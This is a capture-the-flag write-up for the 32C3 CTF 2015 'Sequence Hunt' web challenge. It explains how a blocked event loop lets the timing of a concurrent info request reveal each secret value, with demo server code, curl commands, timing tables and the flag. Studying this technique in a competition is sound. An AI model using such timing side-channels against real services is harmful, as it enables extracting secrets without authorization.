# 32C3 CTF 2015 : Sequence Hunt

**Category:** Web
**Points:** 200
**Solves:** 19
**Description:**

> May we interest you in a little programming exercise?
> 
> 
> <http://136.243.194.36:18888>

This is what we see opening: http://136.243.194.36:18888/
```
Sequence Hunt

Welcome to my integer sequence hunt. You have to compute five numbers between 0 and 100 implementing 
the algorithms below. When you think you have a correct solution, send them as GET parameters here. 
You can also get some info about you here.
I expect a lot of load, so I built this around async IOLoops.
Have Fun!

[EDIT] 
Someone sent me this. Since each check takes considerable time, the server now waits until 
three seconds have passed since the request came in to prevent these attacks. 
[/EDIT]

Algorithms

TODO publish algorithms
```

Opening http://136.243.194.36:18888/info we get
```
you are 37.120.106.140
request count on your IOLoop: 1
```


## Write-up

by [grnd](https://github.com/grnd)

We got the following urls 
- http://136.243.194.36:18888/ - shows us the info (above)
- http://136.243.194.36:18888/check - lets us submit 5 values
- http://136.243.194.36:18888/info - shows the io loop count

The author hinted us that there's a protection against timing attacks, making each request wait until 3 seconds has passed.
And indeed, we see that it take about 3 seconds for `check` request to return, regardless of the values we provide.
```
$ time curl "http://136.243.194.36:18888/check?val0=1&val1=1&val2=1&val3=1&val4=1"
you are 37.120.106.140<br>At least one value is wrong!
0.00s user 
0.01s system 
0% cpu 
3.174 total
```

We also notice that each `check` request increaces the IOLoop count, and so does the `info` request itself. 

Sending `check` requests with various random numbers does not give us any statistically significant differences in timing.
But sending an `info` request while there's an outstanding `check` request shows significant timing side-effect.
This is because the secret algorithm blocks the IO loop, and thus blocks any further requests. 

To better understand what happens, here's a sample node js code. (run with `$ node ser.js`)

```
var http = require('http');
var url = require('url');

// event loop blocking sleep
function sleep(s) {
  var e = new Date().getTime() + s;
  while (new Date().getTime() <= e) {;}
}

var TimingAttackProtectionSeconds = 3;

var IOLoopCounter = 0;

http.createServer(function(request, response) {
  var u = url.parse(request.url, true);

  IOLoopCounter++;

  if (u.path.indexOf('/info') == 0) {
    response.writeHeader(200, {'Content-Type': 'text/html'});
    response.write('IOLoop: ' + IOLoopCounter);
    response.end();

  } else if (u.path.indexOf('/check') == 0) {
    // simulate some algo
    console.log('working hard on our input ' + JSON.stringify(u.query));

    // sleep for 0-3 secs
    var secsZzzz = Math.random() * 3;
    sleep(secsZzzz * 1000);

    // "prevent" the timing attack. wait until 3 seconds pass
    setTimeout(function() {
      response.writeHeader(200, {'Content-Type': 'text/html'});
      response.write('Blocked IO loop for: ' + secsZzzz.toFixed(2) + 's</br>');
      response.write('Total request time: ' + TimingAttackProtectionSeconds + 's</br>');
      response.end();
    }, (TimingAttackProtectionSeconds - secsZzzz) * 1000);

  }
}).listen(8080);

console.log('Server running at http://localhost:8080/');
```

What's important to see is that the sleep function blocks node's event loop (thus blocking further requests to /info), 
while the setTimeout does not, it just sends the response back asyncronically, as soon as we reach 3 seconds in total.

So now all we need to do is to send a `check` request and without waiting for the response, send an `info` request, measuring the time it takes for it to return. 
To automate the search process, and cancel out network gitter, next step was to write a python script that given a set of inputs, opens `n` threads, sends a `check` request and measures the time it takes for `info` request to return, averages the times and returns the result. I used n=5, and it proved to be enough. But it might be bigger depending on the quality of the internet connection.

Here are the results from the first run. note the significant difference with the value `4`
```
[0, 0, 0, 0, 0]: 0.4933500289916992
[1, 1, 1, 1, 1]: 0.3603970050811768
[2, 2, 2, 2, 2]: 0.42971043586730956
[3, 3, 3, 3, 3]: 0.47055706977844236
[4, 4, 4, 4, 4]: 0.9154952526092529 <<<<<<<<<
[5, 5, 5, 5, 5]: 0.46373558044433594
[6, 6, 6, 6, 6]: 0.35578303337097167
[7, 7, 7, 7, 7]: 0.441812801361084
[8, 8, 8, 8, 8]: 0.4297045707702637
```

Above difference in timing appeared only when 4 was in the first possition, so the next step was to enumerate over the rest parameters.
Second digit was found to be `12` 
```
[4, 10, 10, 10, 10]: 0.8408413887023926
[4, 11, 11, 11, 11]: 0.8593394994735718
[4, 12, 12, 12, 12]: 1.228700304031372 <<<<<<<
[4, 13, 13, 13, 13]: 0.9078318119049072
```

Third `77`
```
[4, 12, 73, 73, 73]: 1.442296075820923
[4, 12, 74, 74, 74]: 1.2971014022827148
[4, 12, 75, 75, 75]: 1.273622751235962
[4, 12, 76, 76, 76]: 1.0751570224761964
[4, 12, 77, 77, 77]: 1.9099168300628662 <<<<<<<<<<
[4, 12, 78, 78, 78]: 1.0117467403411866
[4, 12, 79, 79, 79]: 1.2718517780303955
[4, 12, 80, 80, 80]: 1.4834677696228027
```

And so on, until we got to all the params and the [flag](http://136.243.194.36:18888/check?val0=4&val1=12&val2=77&val3=98&val4=35) `[4, 12, 77, 98, 35]`

```
$ curl 'http://136.243.194.36:18888/check?val0=4&val1=12&val2=77&val3=98&val4=35'
you are 37.120.106.140
Congratulations, here is your price:
32C3_round_and_round_and_round_IT_goes
```

## Other write-ups and resources

* none yet
